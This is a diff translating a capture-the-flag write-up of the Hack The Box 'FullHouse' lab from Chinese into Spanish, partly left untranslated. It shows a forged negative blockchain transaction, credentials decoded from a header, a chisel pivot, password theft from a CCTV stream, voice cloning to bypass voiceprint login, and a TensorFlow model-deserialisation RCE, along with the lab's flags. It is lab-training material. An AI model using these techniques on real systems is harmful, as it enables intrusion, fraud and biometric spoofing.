@@ -1,6 +1,6 @@
 
 ---
-# author: randark 
+
 ### FullHouse
 
 ## PUNTO DE ENTRADA
@@ -12,7 +12,8 @@
 
 ## Introducción
 
-> Autor: amra13579
+> Autor máquina: amra13579
+> author tutorial: randark 
 > HTBCasino otorga una gran importancia a la protección de la privacidad y la seguridad de sus jugadores. Por ello, el casino le ha contratado para descubrir e informar sobre posibles vulnerabilidades de seguridad en componentes tanto nuevos como antiguos. Su objetivo es obtener un punto de apoyo en la red interna, escalar privilegios y, finalmente, comprometer por completo toda la infraestructura, recolectando múltiples flags durante el proceso. Este laboratorio profesional está diseñado para poner a prueba sus habilidades en enumeración, revisión de código, movimiento lateral, explotación Web y otras técnicas de ataque.
 > Debe estar plenamente preparado para lo siguiente:
 > * Revisión de código fuente
@@ -81,7 +82,7 @@ start infoscan
 10.13.38.31:9001 open
 [*] alive ports len is: 4
 start vulscan
-[*] WebTitle http://10.13.38.31        code:301 len:178    title:301 Moved Permanently 跳转 url: http://casino.htb/
+[*] WebTitle http://10.13.38.31        code:301 len:178    title:301 Moved Permanently   url: http://casino.htb/
 ```
 
 ## CASINO Port 80 Web Service
@@ -108,33 +109,33 @@ Server: nginx/1.18.0 (Ubuntu)
 </html>
 ```
 
-添加 hosts 记录之后，尝试访问 `http://casino.htb/`
+Después de añadir el registro al archivo hosts, intento acceder a http://casino.htb/:
+
+ `http://casino.htb/`
 
 ![img](img/image_20250313-221322.png)
 
-发现其存在有登录功能
+ Se descubrió que tiene una función de inicio de sesión
 
 ![img](img/image_20250317-221747.png)
 
-## CASINO BlockChains 交易签发漏洞
+## CASINO BlockChains   Vulnerabilidad de emisión de transacciones de cadenas de bloques de CASINO
 
-尝试以 `aa123@a.com:123` 注册一个账户
+Intenta registrar una cuenta con   `aa123@a.com:123` 
 
 ![img](img/image_20250339-223912.png)
 
-在 `Contribute` 页面
+En la página `Contribute`  
 
 ![img](img/image_20250342-224204.png)
 
-得到了一份 `htbchain.zip` 压缩文件
+Se obtuvo un archivo comprimido`htbchain.zip`  
 
 ![img](img/image_20250343-224303.png)
 
-经过分析，这个代码实现了一个简单的区块链系统
+Esto significa que es necesario utilizar este sistema de blockchain para firmar una transacción maliciosa en la cadena (como una transacción con un monto negativo), aumentando así el saldo del atacante.
 
-那么也就是说，需要使用这套区块链系统，往链上签一个恶意的交易（如金额为负的交易），从而使攻击者的余额增加
-
-首先，先构建主要的类，然后编写主逻辑
+En primer lugar, construye las clases principales y luego escribe la lógica principal.
 
 ```python
 import requests
@@ -365,21 +366,23 @@ else:
     print("[!] Check Website !!")
 ```
 
-首先，注册之后，在链上历史会有给攻击者账户转账初始金额的信息
+Primero, después del registro, el historial en cadena contendrá información sobre la cantidad inicial transferida a la cuenta del atacante.
 
 ![img](img/image_20250327-092726.png)
 
-这里的时间对的上的话，字段 `receiver_address` 就是攻击者的公钥地址
+Si las marcas de tiempo coinciden, el campo `receiver_address` contiene la dirección de clave pública del atacante.
 
-将注册得到的 RSA 私钥和公钥地址填入脚本，然后签一个恶意的交易上链，即可恶意增加钱包余额
+Introduzca la clave privada RSA y la dirección de clave pública obtenida durante el registro en el script, y luego firme una transacción maliciosa en la cadena de bloques para aumentar maliciosamente el saldo de la billetera.
 
 ![img](img/image_20250328-092839.png)
 
-这个时候就可以购买 VIP 权限，然后在左侧就可以看到一个新的功能 `Slot`
+
+En este punto, podrás comprar acceso VIP y luego verás una nueva función llamada "Slot" a la izquierda.
 
 ![img](img/image_20250330-093001.png)
 
-在请求 Header 中发现敏感信息
+
+Información confidencial encontrada en el encabezado de la solicitud
 
 ![img](img/image_20250330-093039.png)
 
@@ -389,9 +392,14 @@ c2xvdHNfdGVzdDpzcFZzOWd2c2s4cDhsVko=
 slots_test:spVs9gvsk8p8lVJ
 ```
 
-用户名 `cassandra` 可以在网站页面上找到
+El nombre de usuario «cassandra» se encuentra en la página web.
 
-尝试使用 `cassandra:spVs9gvsk8p8lVJ` 登录服务器
+Intenta iniciar sesión en el servidor con «cassandra:spVs9gvsk8p8lVJ».
+
+
+
+#credential
+ `cassandra:spVs9gvsk8p8lVJ`  
 
 ```bash
 ┌──(kali@ kali)-[~]
@@ -403,7 +411,7 @@ cassandra
 
 ## FLAG - An Apple a Day Keeps the Doctor Away
 
-在当前目录即可发现
+Puedes encontrarlo en el directorio actual.
 
 ```bash
 cassandra@casino:~$ ls -lh
@@ -413,16 +421,15 @@ total 5.8M
 cassandra@casino:~$ cat flag.txt
 FHS{b4l4nc3_4ll_z3r0s_fr0m_sl0t5}
 ```
-
-即可得到答案
+para obtener la respuesta
 
 ```flag
 FHS{b4l4nc3_4ll_z3r0s_fr0m_sl0t5}
 ```
 
-## CASINO 建立中转枢纽
+## CASINO Establece un Centro de Tránsito
 
-探测一下基本情况
+Analicemos los conceptos básicos.
 
 ```bash
 (remote) cassandra@casino:/home/cassandra$ ifconfig
@@ -460,7 +467,7 @@ _gateway (10.13.38.2) at 00:50:56:94:40:64 [ether] on eth0
 ? (10.0.52.2) at 00:50:56:94:13:cf [ether] on eth1
 ```
 
-上传 `fscan` 之后，对 `10.0.52.0/24` 进行探测
+Después de cargar `fscan`, realice un escaneo en `10.0.52.0/24`.
 
 ```bash
 (remote) cassandra@casino:/tmp$ ./fscan -h 10.0.52.31/24
@@ -487,8 +494,8 @@ start vulscan
    [->]10.0.52.2
 [*] NetBios 10.0.52.2       [+] DC:FULLHOUSE\DC
 ```
-
-使用 `chisel` 建立中转枢纽
+ 
+Utilice `chisel` para establecer un centro de tránsito
 
 ```bash
 # Local Kali
@@ -505,9 +512,9 @@ start vulscan
 2025/03/20 01:51:06 client: Connected (Latency 227.257811ms)
 ```
 
-## CCTV 资产探测
+## CCTV  : Detección de activos mediante CCTV
 
-使用 `nmap` 扫描
+Escaneo con `nmap`
 
 ```bash
 ┌──(kali@ kali)-[~]
@@ -528,8 +535,9 @@ OS fingerprint not ideal because: Didn't receive UDP response. Please try again 
 No OS matches for host
 Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
 ```
+El `OpenSSH 9.3` en el puerto `22` definitivamente no es el objetivo, así que probemos el protocolo RTSP.
 
-`22` 端口上的 `OpenSSH 9.3` 肯定不是目标，那么探测一下 RTSP 协议
+ 
 
 ```bash
 ┌──(kali@ kali)-[~]
@@ -545,7 +553,7 @@ PORT    STATE SERVICE VERSION
 |_rtsp-methods: OPTIONS, DESCRIBE, ANNOUNCE, GET_PARAMETER, PAUSE, PLAY, RECORD, SETUP, SET_PARAMETER, TEARDOWN
 ```
 
-尝试连接一下，看一下视频流
+Intente conectarse y verificar la transmisión de video.
 
 ```bash
 ┌──(kali@ kali)-[~]
@@ -572,13 +580,13 @@ Press [q] to stop, [?] for help
 frame= 2278 fps= 24 q=-1.0 Lsize=   70143KiB time=00:01:31.86 bitrate=6255.0kbits/s speed=0.983x
 ```
 
-得到一个 `mp4` 文件之后，播放它
+Después de obtener un archivo 'mp4', reprodúzcalo.
 
 ![img](img/image_20250316-101624.png)
 
 得到一个密码 `4vQ03013nKj9`
 
-尝试使用这个密码登录服务器
+Intente utilizar esta contraseña para iniciar sesión en el servidor.
 
 ```bash
 ┌──(kali@ kali)-[~]
@@ -597,18 +605,17 @@ total 4.0K
 root@casino:~# cat flag.txt
 FHS{1_th1nk_w3_4r3_b31ng_w4tch3d_O.O}
 ```
-
-即可得到答案
+para obtener la respuesta
 
 ```flag
 FHS{1_th1nk_w3_4r3_b31ng_w4tch3d_O.O}
 ```
 
-## VAULT 资产探测
+## Sondeo de activos de VAULT
 
-由靶场界面可以得知，靶机 VAULT 是一台 Windows 靶机，由 ARP 和 Ping 记录不一致也可以大致猜测出来
+El equipo de destino VAULT es un equipo Windows, como se puede ver en la interfaz de destino. Esto también se puede inferir a grandes rasgos de la discrepancia entre los registros ARP y Ping.
 
-不使用 Ping 进行探测
+Sondeo sin usar Ping.
 
 ```bash
 (remote) root@casino:/tmp# ./fscan -np -h 10.0.52.111
@@ -621,24 +628,24 @@ start vulscan
 [*] 扫描结束, 耗时: 4.043295941s
 ```
 
-尝试直接访问
+Intenta acceder directamente
 
 ![img](img/image_20250355-125543.png)
 
-看起来是一个声纹加密的储存库，需要尝试欺骗这里的声纹识别系统
+Parece ser un repositorio con huella de voz cifrada; necesito intentar engañar al sistema de reconocimiento de voz.
 
-在已经得到完整权限的 `CASINO` 服务器上搜寻有用的音频文件
+Estoy buscando archivos de audio útiles en el servidor `CASINO`, al que ya tengo acceso completo.
 
 ```bash
 (remote) root@casino:/tmp# find / -type f \( -name "*.mp3" -o -name "*.wav" -o -name "*.flac" -o -name "*.aac" -o -name "*.ogg" -o -name "*.m4a" \) 2>/dev/null
 /var/www/casino/static/audio/manifest.wav
 ```
 
-将 `manifest.wav` 文件下载下来
+Descargue el archivo `manifest.wav`.
 
 [manifest.wav](assets/manifest.wav)
 
-尝试使用 [PlayAI](https://app.play.ht) 对声音进行克隆
+Intente clonar el sonido usando [PlayAI](https://app.play.ht).
 
 ![img](img/image_20250319-141952.png)
 
@@ -646,13 +653,13 @@ start vulscan
 
 [generated_audio-2.wav](assets/generated_audio-2.wav)
 
-上传之后，即可通过认证
+Después de cargar, puedes pasar la verificación.
 
 ![img](img/image_20250320-142011.png)
 
 ## FLAG - I hear you!
 
-flag 在界面上显示
+La bandera se muestra en la interfaz.
 
 ```flag
 FHS{n0w_th3y_4r3_l1st3n1ng_t00}
@@ -660,19 +667,19 @@ FHS{n0w_th3y_4r3_l1st3n1ng_t00}
 
 ## VAULT Tensoflow 加载模型反序列化
 
-在界面上，可以看到一个上传 Tensoflow 的 `.h5` 模型的功能点
+En la interfaz, puedes ver una función para cargar modelos Tensoflow .h5.
 
 ![img](img/image_20250350-085054.png)
 
-尝试构造一个恶意的模型实现加载的时候反序列化触发 RCE
+Se intentó construir un modelo malicioso que activa RCE durante la deserialización al cargar.
 
 :::warning
 
-根据服务器 Web 服务指纹，可以确定是 IIS 服务，所以使用的是 Windows 的 RCE Payload
+Según la huella digital del servicio web del servidor, se puede identificar como un servicio IIS, por lo tanto, se utiliza la carga útil de Windows RCE.
 
 :::
 
-可以参考 [Splinter0/tensorflow-rce: RCE PoC for Tensorflow using a malicious Lambda layer](https://github.com/Splinter0/tensorflow-rce)
+Puede referirse a [Splinter0/tensorflow-rce: RCE PoC for Tensorflow using a malicious Lambda layer](https://github.com/Splinter0/tensorflow-rce)
 
 ```dockerfile
 
@@ -699,7 +706,7 @@ model.compile()
 model.save("exploit.h5")
 ```
 
-然后编译镜像并启动容器
+Luego compila la imagen e inicia el contenedor.
 
 ```bash
 kali@developer:~/codes/Hackthebox-Fullhouse$ docker build -t fullhouse-exp .
@@ -746,7 +753,7 @@ total 20K
 -rw-rw-r-- 1 root root 458 Mar 21 01:00 exploit.py
 ```
 
-然后将 `.h5` 提取出来
+Luego extraiga el archivo `.h5`.
 
 ```bash
 root@e1cc11c93e27:~# exit
@@ -758,9 +765,9 @@ kali@developer:~/codes/Hackthebox-Fullhouse$ docker cp e1cc11c93e27:/root/exploi
 Successfully copied 14.8kB to /home/randark/codes/Hackthebox-Fullhouse/.
 ```
 
-并上传这个模型
+Y sube este modelo.
 
-TODO 网站服务有问题，如果上传的模型不能工作，就会卡死一段时间
+TODO: El servicio del sitio web tiene problemas; si el modelo subido no funciona, se bloqueará temporalmente.
 
 ## Assets and Reviews
 
@@ -772,14 +779,15 @@ TODO 网站服务有问题，如果上传的模型不能工作，就会卡死一
 >
 > IP Address: 10.0.52.31
 
-- 代码审计
-- Blockchains 区块链攻击
+- Auditoría de código
+
+- Ataques a blockchain
 
 ### CCTV
 
 > IP Address: 10.0.52.5
 
-- RTSP 协议交互
+- Interacción del protocolo RTSP
 
 ### VAULT
 
